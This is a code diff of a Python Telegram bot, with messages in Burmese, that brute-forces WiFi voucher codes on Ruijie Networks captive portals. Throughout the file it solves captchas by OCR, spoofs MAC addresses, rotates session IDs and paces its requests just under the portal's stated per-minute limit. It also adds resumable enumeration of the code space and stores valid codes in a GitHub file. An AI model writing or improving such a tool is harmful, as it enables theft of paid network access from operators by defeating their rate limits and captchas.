@@ -7,8 +7,9 @@ import cv2
 import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
+from itertools import product
 
-# ⭐ NEW: Logging setup
+# ⭐ Logging setup
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
@@ -27,7 +28,7 @@ if not BOT_TOKEN:
     raise SystemExit("❌ BOT_TOKEN environment variable not set")
 
 # ── Global structures ─────────────────────────────────────────────────────
-TG_MAX_LEN = 4000                # ⭐ NEW: Telegram safe message limit
+TG_MAX_LEN = 4000
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 
@@ -36,6 +37,8 @@ scan_tasks = {}
 success_texts = {}
 limited_texts = {}
 captcha_state = {}
+session_fail_count = {}
+last_scan_index = {}
 
 # Settings
 notify_setting = {}
@@ -49,16 +52,20 @@ session = None
 _connector = None
 CONCURRENCY = 300
 BATCH_SIZE = 500
-CAPTCHA_RETRY = 5
-MAX_ATTEMPTS = 2
+CAPTCHA_RETRY = 8           # ⭐ 2026: captcha auto-trigger ကြောင့် retry တိုး
+MAX_ATTEMPTS = 3            # ⭐ 2026: session rotation ကြောင့် attempt တိုး
 PROGRESS_INTERVAL = 3
 GITHUB_INTERVAL = 30
-SESSION_RECHECK_INTERVAL = 600   # ⭐ NEW: 10 minutes — revalidate session URLs
+SESSION_RECHECK_INTERVAL = 600
+SESSION_FAIL_THRESHOLD = 3
+RATE_LIMIT_WINDOW = 60      # ⭐ 2026: ၁ မိနစ်အတွင်း ၃၀ ကြိမ် limit
+MAX_VOUCHER_PER_MIN = 25    # ⭐ 2026: ၃၀ ကြိမ် limit မရောက်အောင် ၂၅ ကြိမ်ပဲ
 _voucher_sem = None
+_ocr_lock = None
+_rate_limiter = None         # ⭐ 2026: rate limiter
 _start_time = time.monotonic()
 
-# ── Portal Configuration ───────────────────────────────────────────────────
-# 🔧 FIXED: referer_balance URL typo (ruijienetwoacom → ruijienetworks.com, authTypeype → authType)
+# ── Portal Configuration (2026 Update) ────────────────────────────────────
 PORTAL_CONFIGS = {
     "portal-mm-as": {
         "domain": "portal-mm-as.ruijienetworks.com",
@@ -96,33 +103,51 @@ def get_portal_config(session_url=None):
             return PORTAL_CONFIGS["portal-as"], "portal-as"
     return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL
 
-# ── ⭐ NEW: Helper functions for message safety ────────────────────────────
+# ── ⭐ 2026: Rate Limiter ──────────────────────────────────────────────────
+class RateLimiter:
+    """Ruijie 2026: ၁ မိနစ်အတွင်း ၃၀ ကြိမ် limit ရှိသည်။"""
+    def __init__(self, max_per_minute=25):
+        self.max_per_minute = max_per_minute
+        self.timestamps = []
+        self.lock = asyncio.Lock()
+
+    async def acquire(self):
+        async with self.lock:
+            now = time.monotonic()
+            self.timestamps = [t for t in self.timestamps if now - t < RATE_LIMIT_WINDOW]
+            if len(self.timestamps) >= self.max_per_minute:
+                wait = RATE_LIMIT_WINDOW - (now - self.timestamps[0]) + 0.1
+                if wait > 0:
+                    log.info(f"[rate-limiter] waiting {wait:.1f}s (limit: {self.max_per_minute}/min)")
+                    await asyncio.sleep(wait)
+                    now = time.monotonic()
+                    self.timestamps = [t for t in self.timestamps if now - t < RATE_LIMIT_WINDOW]
+            self.timestamps.append(time.monotonic())
+
+# ── ⭐ Helper functions ────────────────────────────────────────────────────
 def _truncate(text, limit=TG_MAX_LEN):
-    """Truncate text safely for Telegram message limit."""
     if len(text) <= limit:
         return text
     return text[:limit - 20] + "\n… (truncated)"
 
+def _md_escape(s):
+    return re.sub(r'([_*`\[\]])', r'\\\1', str(s))
+
 async def _safe_edit(chat_id, message_id, text, parse_mode=None):
-    """Edit message with length-safety and fallback to new message on failure."""
     text = _truncate(text)
     try:
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=text,
-            parse_mode=parse_mode
-        )
+        await bot.edit_message_text(chat_id=chat_id, message_id=message_id,
+                                    text=text, parse_mode=parse_mode)
         return message_id
-    except Exception as e:
+    except Exception:
         try:
             sent = await bot.send_message(chat_id, text, parse_mode=parse_mode)
             return sent.message_id
         except Exception as e2:
-            log.warning(f"[_safe_edit] failed for {chat_id}: {e} / {e2}")
+            log.warning(f"[_safe_edit] failed for {chat_id}: {e2}")
             return message_id
 
-# ── Web server (keep alive) ────────────────────────────────────────────────
+# ── Web server ────────────────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
 
@@ -135,7 +160,7 @@ async def web_server():
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
 
-# ── GitHub helpers ─────────────────────────────────────────────────────────
+# ── GitHub helpers ────────────────────────────────────────────────────────
 async def get_file_content(path):
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
@@ -151,10 +176,7 @@ async def get_file_content(path):
 
 async def update_file_content(path, content, sha, message):
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Content-Type": "application/json"
-    }
+    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
     encoded = base64.b64encode(json.dumps(content).encode()).decode()
     payload = {"message": message, "content": encoded}
     if sha:
@@ -162,7 +184,7 @@ async def update_file_content(path, content, sha, message):
     async with session.put(url, headers=headers, json=payload) as response:
         return await response.text()
 
-# ── Helper functions ───────────────────────────────────────────────────────
+# ── Time / size formatters ────────────────────────────────────────────────
 def plan_to_minutes(s):
     if not s:
         return 0
@@ -190,8 +212,7 @@ def _parse_seconds(val):
         return f"{hours}h {mins}m"
     elif mins > 0:
         return f"{mins}m"
-    else:
-        return f"{secs}s"
+    return f"{secs}s"
 
 def _parse_minutes(val):
     total_mins = int(val)
@@ -220,8 +241,7 @@ def _format_bytes(bytes_val):
             return f"{bytes_val/(1024**2):.3f} MB"
         elif bytes_val >= 1024:
             return f"{bytes_val/1024:.3f} KB"
-        else:
-            return f"{bytes_val:.0f} B"
+        return f"{bytes_val:.0f} B"
     except:
         return "N/A"
 
@@ -235,7 +255,6 @@ def _format_quota(used, total=None):
             total_used = used
             up = 0
             down = 0
-
         used_str = _format_bytes(total_used)
         if up and down:
             return f"{used_str}({_format_bytes(up)}↑ / {_format_bytes(down)}↓)"
@@ -243,7 +262,6 @@ def _format_quota(used, total=None):
     except:
         return "N/A"
 
-# ⭐ NEW: Parse expire date string into datetime (best effort)
 def _parse_expire(expire_str):
     if not expire_str or expire_str == "N/A":
         return None
@@ -261,11 +279,10 @@ def _parse_expire(expire_str):
             continue
     return None
 
-# ⭐ NEW: Check if expired code
 def is_expired(expire_str):
     dt = _parse_expire(expire_str)
     if dt is None:
-        return False  # Unknown → don't remove
+        return False
     return dt < datetime.now()
 
 async def get_balance(token, portal_config):
@@ -289,15 +306,16 @@ async def get_balance(token, portal_config):
         'x-requested-with': 'XMLHttpRequest',
     }
     try:
-        async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+        async with session.get(url, headers=headers, cookies=cookies,
+                               timeout=aiohttp.ClientTimeout(total=8)) as resp:
             raw = await resp.text()
             if resp.status != 200:
                 alt_url = f"{portal_config['base_url']}/api/macc2/balance/getBalance/{token}"
-                async with session.get(alt_url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=8)) as alt_resp:
+                async with session.get(alt_url, headers=headers, cookies=cookies,
+                                       timeout=aiohttp.ClientTimeout(total=8)) as alt_resp:
                     raw = await alt_resp.text()
                     if alt_resp.status != 200:
                         return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
-
             try:
                 data = json.loads(raw)
             except Exception:
@@ -324,10 +342,7 @@ async def get_balance(token, portal_config):
                         break
                 usage = d.get('usage') or d.get('dataUsage') or d.get('traffic')
                 if usage:
-                    if isinstance(usage, dict):
-                        result["usage"] = _format_quota(usage)
-                    else:
-                        result["usage"] = _format_bytes(usage)
+                    result["usage"] = _format_quota(usage) if isinstance(usage, dict) else _format_bytes(usage)
                 quota = d.get('quota') or d.get('dataQuota') or d.get('limit')
                 session_quota = d.get('sessionQuota')
                 total_quota = d.get('totalQuota')
@@ -346,21 +361,33 @@ async def get_balance(token, portal_config):
         log.error(f"[get_balance] error for {token}: {e}")
         return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
 
-def iter_codes(mode, length):
+# ── Deterministic code iterator (resume-friendly) ─────────────────────────
+def _get_charset(mode):
     if mode == 1:
-        chars = string.digits
+        return string.digits
     elif mode == 2:
-        chars = string.ascii_lowercase
+        return string.ascii_lowercase
     elif mode == 3:
-        chars = string.ascii_uppercase
+        return string.ascii_uppercase
     elif mode == 4:
-        chars = string.ascii_letters
+        return string.ascii_letters
     elif mode == 5:
-        chars = string.ascii_lowercase + string.digits
-    else:
-        raise ValueError(f"Invalid mode: {mode}. Use 1-5")
-    while True:
-        yield "".join(random.choice(chars) for _ in range(length))
+        return string.ascii_lowercase + string.digits
+    raise ValueError(f"Invalid mode: {mode}. Use 1-5")
+
+def iter_codes(mode, length, start_index=0):
+    chars = _get_charset(mode)
+    base = len(chars)
+    total = base ** length
+    idx = start_index
+    while idx < total:
+        n = idx
+        code = []
+        for _ in range(length):
+            code.append(chars[n % base])
+            n //= base
+        yield "".join(code), idx
+        idx += 1
 
 def format_progress(checked, total=None, speed=0, found=0, target=None):
     lines = [
@@ -373,7 +400,7 @@ def format_progress(checked, total=None, speed=0, found=0, target=None):
         lines.append(f"🎯 Target: {found}/{target}")
     return "\n".join(lines)
 
-# ── Captcha handling ──────────────────────────────────────────────────────
+# ── Captcha handling (2026 Update: serialized + robust) ───────────────────
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def _ocr_sync(image_bytes):
@@ -384,11 +411,14 @@ def _ocr_sync(image_bytes):
     gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
     _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
     _, buffer = cv2.imencode('.png', thresh)
-    result = _ocr.classification(buffer.tobytes())
-    return result.upper()
+    return _ocr.classification(buffer.tobytes()).upper()
 
 async def Captcha_Text(image_bytes):
-    return await asyncio.to_thread(_ocr_sync, image_bytes)
+    global _ocr_lock
+    if _ocr_lock is None:
+        _ocr_lock = asyncio.Lock()
+    async with _ocr_lock:
+        return await asyncio.to_thread(_ocr_sync, image_bytes)
 
 def get_mac():
     first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
@@ -414,7 +444,6 @@ async def get_session_id(session_obj, session_url, previous_session_id=None):
         'sec-fetch-site': 'same-origin',
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
     }
     try:
         async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
@@ -463,6 +492,7 @@ async def Varify_Captcha(session_obj, session_id, text, portal_config):
         data = await req.json()
         return session_id if data.get("success") == True else None
 
+# ── Session validity check (lenient) ──────────────────────────────────────
 async def check_session_url(session_url):
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -479,18 +509,40 @@ async def check_session_url(session_url):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
     }
     try:
-        async with session.get(session_url, allow_redirects=True, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
-            return "sessionId" in str(response.url)
-    except:
-        return False
+        async with session.get(session_url, allow_redirects=True, headers=headers,
+                               timeout=aiohttp.ClientTimeout(total=10)) as response:
+            url_str = str(response.url)
+            if "ruijienetworks.com" in url_str:
+                return True
+            if "sessionId" in url_str:
+                return True
+            try:
+                body = (await response.text()).lower()
+            except:
+                body = ""
+            if "expired" in body or "invalid session" in body:
+                return False
+            if response.status >= 500:
+                return None
+            return True
+    except (asyncio.TimeoutError, aiohttp.ClientError):
+        return None
+    except Exception:
+        return None
 
-# ── Core voucher check ────────────────────────────────────────────────────
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
-    global _connector
+# ── Core voucher check (2026 Update) ──────────────────────────────────────
+async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
+                        message=None, plan_filters=None):
+    global _connector, _rate_limiter
     if not recheck:
         current_task = scan_tasks.get(chat_id)
         if not current_task or current_task.get("scan_id") != scan_id:
             return
+
+    # ⭐ 2026: Rate limiter — ၃၀ ကြိမ် limit မရောက်အောင်
+    if _rate_limiter is None:
+        _rate_limiter = RateLimiter(MAX_VOUCHER_PER_MIN)
+    await _rate_limiter.acquire()
 
     portal_config, portal_name = get_portal_config(session_url)
     post_url = portal_config['voucher_api']
@@ -499,6 +551,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     session_id = None
 
     for attempt in range(MAX_ATTEMPTS):
+        response = None
         timeout = aiohttp.ClientTimeout(total=20)
         async with aiohttp.ClientSession(
             connector=_connector,
@@ -506,6 +559,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             cookie_jar=aiohttp.CookieJar(),
             timeout=timeout
         ) as task_session:
+            # ⭐ 2026: Session ID rotation — every attempt gets fresh session
             session_id = await get_session_id(task_session, session_url)
             if not session_id:
                 continue
@@ -554,7 +608,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             try:
                 async with task_session.post(post_url, json=data, headers=headers) as req:
                     response = await req.text()
-                    json.loads(response)
             except Exception as e:
                 log.debug(f"[perform_check] network error: {e}")
                 continue
@@ -563,6 +616,11 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             wait = min(2 ** attempt, 6)
             log.info(f"[perform_check] rate limited, waiting {wait}s (attempt {attempt+1}/{MAX_ATTEMPTS})")
             await asyncio.sleep(wait)
+            continue
+
+        try:
+            json.loads(response) if response else None
+        except Exception:
             continue
         break
 
@@ -623,18 +681,17 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
             code_lines = []
             for item in success_texts[chat_id]:
-                line = f"`{item['code']}` – ⏳ {item['plan']}"
+                line = f"`{_md_escape(item['code'])}` – ⏳ {_md_escape(item['plan'])}"
                 if item.get('usage') and item['usage'] != 'N/A':
-                    line += f"\n   📊 {item['usage']}"
+                    line += f"\n   📊 {_md_escape(item['usage'])}"
                 if item.get('quota') and item['quota'] != 'N/A':
-                    line += f" | 💾 {item['quota']}"
+                    line += f" | 💾 {_md_escape(item['quota'])}"
                 if item.get('portal'):
-                    line += f" | 🌐 {item['portal']}"
+                    line += f" | 🌐 {_md_escape(item['portal'])}"
                 code_lines.append(line)
             code_text = "\n".join(code_lines)
             full = f"✅ Success Codes:\n{code_text}"
 
-            # 🔧 FIXED: use _safe_edit + truncate
             if chat_id not in success_messages:
                 try:
                     sent = await bot.send_message(chat_id, _truncate(full), parse_mode="Markdown")
@@ -654,7 +711,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
             limited_line = "\n".join(limited_texts[chat_id])
             full = f"⚠️ Limited Codes:\n{limited_line}"
-            # 🔧 FIXED: use _safe_edit + truncate
             if chat_id not in limited_messages:
                 try:
                     sent = await bot.send_message(chat_id, _truncate(full))
@@ -666,19 +722,21 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     chat_id, limited_messages[chat_id], full
                 )
 
-# ── Brute-force runner ────────────────────────────────────────────────────
-async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
+# ── Brute-force runner (resume-friendly) ─────────────────────────────────
+async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
+                         target=None, message=None, progress_msg=None,
+                         plan_filters=None, start_index=0):
     try:
-        code_iter = iter_codes(mode, length)
+        code_iter = iter_codes(mode, length, start_index)
     except ValueError as e:
         await bot.send_message(chat_id, str(e))
         return
 
-    total = None
-    checked = 0
     found = 0
+    checked = 0
     scan_start = time.monotonic()
     last_progress_update = 0
+    last_saved_index = start_index
 
     global _voucher_sem
     if _voucher_sem is None:
@@ -690,28 +748,48 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
             if not current_task or current_task.get("scan_id") != scan_id:
                 return
             if current_task.get("stop"):
-                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": plan_filters or []}
+                last_scan_params[chat_id] = {
+                    "mode": mode, "length": length, "target": target,
+                    "plan_filters": plan_filters or [],
+                    "start_index": last_saved_index
+                }
                 scan_tasks.pop(chat_id, None)
                 return
 
             batch = []
             for _ in range(BATCH_SIZE):
-                batch.append(next(code_iter))
+                try:
+                    batch.append(next(code_iter))
+                except StopIteration:
+                    break
+            if not batch:
+                await _safe_edit(chat_id, progress_msg.message_id,
+                                 f"✅ Search space exhausted.\n"
+                                 f"🔍 Checked: {checked:,}\n💎 Found: {found}")
+                scan_tasks.pop(chat_id, None)
+                last_scan_params.pop(chat_id, None)
+                return
 
-            async def _check(code):
+            async def _check(code, idx):
                 async with _voucher_sem:
-                    return await perform_check(
+                    res = await perform_check(
                         session_url, code, chat_id, scan_id, message=message,
                         plan_filters=plan_filters
                     )
+                    return res, idx
 
-            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
+            results = await asyncio.gather(*[_check(c, i) for c, i in batch],
+                                           return_exceptions=True)
 
             for res in results:
-                if res:
+                if isinstance(res, Exception):
+                    continue
+                r, idx = res
+                last_saved_index = idx + 1
+                if r:
                     found += 1
                     if target and found >= target:
-                        await progress_msg.edit_text("🎯 Target reached!")
+                        await _safe_edit(chat_id, progress_msg.message_id, "🎯 Target reached!")
                         scan_tasks.pop(chat_id, None)
                         last_scan_params.pop(chat_id, None)
                         return
@@ -722,12 +800,13 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
 
             now = time.monotonic()
             if now - last_progress_update >= PROGRESS_INTERVAL:
-                text = format_progress(checked, total, speed, found, target)
-                # 🔧 FIXED: use _safe_edit
+                text = format_progress(checked, None, speed, found, target)
                 new_id = await _safe_edit(chat_id, progress_msg.message_id, text)
                 if new_id != progress_msg.message_id:
                     progress_msg.message_id = new_id
                 last_progress_update = now
+
+            last_scan_index[chat_id] = last_saved_index
     finally:
         scan_tasks.pop(chat_id, None)
 
@@ -757,13 +836,13 @@ async def github_update_scheduler():
                     })
             await update_file_content("result.json", results, sha, "Periodic Update")
         except Exception as e:
-            # 🔧 FIXED: requeue on failure
             log.error(f"[github] update failed, requeueing {len(items)} items: {e}")
             for item in items:
                 await SUCCESS_CODE.put(item)
 
-# ⭐ NEW: Session URL periodic revalidation
+# ── Session recheck (lenient, threshold-based) ────────────────────────────
 async def session_recheck_scheduler():
+    global session_fail_count
     while True:
         await asyncio.sleep(SESSION_RECHECK_INTERVAL)
         for cid, data in list(user_data.items()):
@@ -772,25 +851,45 @@ async def session_recheck_scheduler():
                 continue
             try:
                 ok = await check_session_url(url)
-                if not ok:
-                    log.warning(f"[session_recheck] session invalid for chat {cid}")
-                    try:
-                        await bot.send_message(
-                            cid,
-                            "⚠️ သင့် Session URL သက်တမ်းကုန်သွားပါပြီ။ /setup ဖြင့် အသစ်ထည့်ပါ။"
-                        )
-                    except:
-                        pass
-                    # Auto-stop scan if running
-                    task_data = scan_tasks.get(cid)
-                    if task_data:
-                        task_data["stop"] = True
-                        if not task_data["task"].done():
-                            task_data["task"].cancel()
+
+                if ok is None:
+                    log.debug(f"[session_recheck] unknown for {cid}, skip")
+                    continue
+
+                if ok:
+                    session_fail_count.pop(cid, None)
+                    continue
+
+                fails = session_fail_count.get(cid, 0) + 1
+                session_fail_count[cid] = fails
+                log.warning(f"[session_recheck] fail {fails}/{SESSION_FAIL_THRESHOLD} for {cid}")
+
+                if fails < SESSION_FAIL_THRESHOLD:
+                    continue
+
+                try:
+                    await bot.send_message(
+                        cid,
+                        "⚠️ Session URL သက်တမ်းကုန်သွားပါပြီ။\n"
+                        "Scan ရပ်ထားပြီးပါပြီ။\n"
+                        "/setup ဖြင့် အသစ်ထည့်ပါ။\n"
+                        "(ပြန်စချင်ရင် /resume နှိပ်ပါ — ရပ်ခဲ့တဲ့နေရာကနေ ဆက်ရှာမယ်)"
+                    )
+                except:
+                    pass
+
+                user_data.pop(cid, None)
+                session_fail_count.pop(cid, None)
+
+                task_data = scan_tasks.get(cid)
+                if task_data:
+                    task_data["stop"] = True
+                    if not task_data["task"].done():
+                        task_data["task"].cancel()
             except Exception as e:
                 log.debug(f"[session_recheck] error for {cid}: {e}")
 
-# ── Bot commands ───────────────────────────────────────────────────────────
+# ── Bot commands ──────────────────────────────────────────────────────────
 @bot.message_handler(commands=['start'])
 async def start(message):
     await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")
@@ -800,8 +899,7 @@ async def help_cmd(message):
     help_text = (
         "📚 **Command လမ်းညွှန်**\n\n"
         "၁။ **Setup**:\n"
-        "   /setup <url>\n"
-        "   (portal-mm-as သို့မဟုတ် portal-as URL)\n\n"
+        "   /setup <url>\n\n"
         "၂။ **ရှာဖွေခြင်း**:\n"
         "   /brute <mode> <length> [target]\n"
         "   Mode:\n"
@@ -813,10 +911,10 @@ async def help_cmd(message):
         "   ဥပမာ: /brute 1 6 5\n\n"
         "၃။ /status  – အခြေအနေကြည့်\n"
         "၄။ /stop    – ရပ်တန့်ခြင်း\n"
-        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
+        "၅။ /resume  – ဆက်ရှာဖွေခြင်း (ရပ်ခဲ့တဲ့နေရာကနေ)\n"
         "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
         "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
-        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း (expired auto-remove)\n"
+        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
         "၉။ /notify  – Notification ON/OFF"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
@@ -825,46 +923,56 @@ async def help_cmd(message):
 async def handle_setup(message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url\n\nဥပမာ:\nhttps://portal-mm-as.ruijienetworks.com/...")
+        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
         return
     url = args[1]
     await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
-    if await check_session_url(url):
-        cid = message.chat.id
-        portal_config, portal_name = get_portal_config(url)
-        user_data[cid] = {'session_url': url, 'portal_type': portal_name}
-        success_texts.pop(cid, None)
-        limited_texts.pop(cid, None)
-        last_scan_params.pop(cid, None)
-        pending_brute.pop(cid, None)
-        success_messages.pop(cid, None)
-        limited_messages.pop(cid, None)
-        try:
-            results, sha = await get_file_content("result.json")
-            if str(cid) in results:
-                del results[str(cid)]
-                await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
-        except Exception as e:
-            log.error(f"[setup] GitHub clear error: {e}")
-        await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}\n/brute ဖြင့် စတင်ပါ။")
-    else:
-        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")
+
+    check = await check_session_url(url)
+    if check is False:
+        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။")
+        return
+
+    cid = message.chat.id
+    portal_config, portal_name = get_portal_config(url)
+    user_data[cid] = {'session_url': url, 'portal_type': portal_name}
+
+    success_texts.pop(cid, None)
+    limited_texts.pop(cid, None)
+    pending_brute.pop(cid, None)
+    success_messages.pop(cid, None)
+    limited_messages.pop(cid, None)
+    session_fail_count.pop(cid, None)
+
+    try:
+        results, sha = await get_file_content("result.json")
+        if str(cid) in results:
+            del results[str(cid)]
+            await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
+    except Exception as e:
+        log.error(f"[setup] GitHub clear error: {e}")
+
+    resume_hint = ""
+    if cid in last_scan_params:
+        prev = last_scan_params[cid]
+        resume_hint = (
+            f"\n\n💡 ယခင် scan ရှိပါသည် (mode: {prev['mode']}, length: {prev.get('length', '?')})။\n"
+            f"ဆက်ရှာရန် /resume ကို နှိပ်ပါ — ရပ်ခဲ့တဲ့နေရာကနေ ဆက်ရှာမယ်။"
+        )
+
+    await bot.reply_to(
+        message,
+        f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}{resume_hint}"
+    )
 
 @bot.message_handler(commands=['brute'])
 async def brute(message):
     args = message.text.split()
     if len(args) < 3:
         await bot.reply_to(message,
-            "အသုံးပြုနည်း:\n"
-            "/brute <mode> <length> [target]\n\n"
-            "Mode:\n"
-            "  1 = ဂဏန်းသီးသန့် (0-9)\n"
-            "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
-            "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
-            "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
-            "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
-            "ဥပမာ:\n"
-            "/brute 1 6 5\n/brute 2 6\n/brute 5 8 10"
+            "အသုံးပြုနည်း:\n/brute <mode> <length> [target]\n\n"
+            "Mode:\n  1 = 0-9\n  2 = a-z\n  3 = A-Z\n  4 = a-zA-Z\n  5 = a-z0-9\n\n"
+            "ဥပမာ:\n/brute 1 6 5\n/brute 5 8 10"
         )
         return
 
@@ -872,7 +980,6 @@ async def brute(message):
         mode = int(args[1])
         length = int(args[2])
         target = int(args[3]) if len(args) > 3 else None
-
         if mode not in [1, 2, 3, 4, 5]:
             await bot.reply_to(message, "❌ Mode သည် 1-5 အတွင်းဖြစ်ရပါမည်။")
             return
@@ -898,29 +1005,29 @@ async def brute(message):
         pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": []}
         prev = last_scan_params[chat_id]
         await bot.reply_to(message,
-            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev.get('length', '?')}, target: {prev['target']}).\nပြန်စမလား၊ အသစ်စမလား?",
+            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev.get('length', '?')}, "
+            f"target: {prev['target']}, ရပ်ခဲ့တဲ့ index: {prev.get('start_index', 0)}).\n"
+            f"ပြန်စမလား၊ အသစ်စမလား?",
             reply_markup=markup)
         return
 
     await start_brute_scan(chat_id, mode, length, target, message)
 
-async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
+async def start_brute_scan(chat_id, mode, length, target, original_message,
+                           plan_filters=None, start_index=0):
     plan_filters = plan_filters or []
     filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
-    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}")
+    resume_note = f" | Resume from: {start_index}" if start_index > 0 else ""
+    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}{resume_note}")
     scan_id = str(uuid.uuid4())
     task = asyncio.create_task(
         run_bruteforce(
             mode, length, chat_id, user_data[chat_id]['session_url'],
             scan_id, target, message=original_message, progress_msg=progress_msg,
-            plan_filters=plan_filters
+            plan_filters=plan_filters, start_index=start_index
         )
     )
-    scan_tasks[chat_id] = {
-        "task": task,
-        "stop": False,
-        "scan_id": scan_id
-    }
+    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
     success_messages.pop(chat_id, None)
     limited_messages.pop(chat_id, None)
 
@@ -943,8 +1050,12 @@ async def resume_scan(message):
         await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
         return
     params = last_scan_params.pop(chat_id)
-    await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], message, plan_filters=params.get('plan_filters', []))
-    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")
+    await start_brute_scan(
+        chat_id, params['mode'], params.get('length', 6), params['target'],
+        message, plan_filters=params.get('plan_filters', []),
+        start_index=params.get('start_index', 0)
+    )
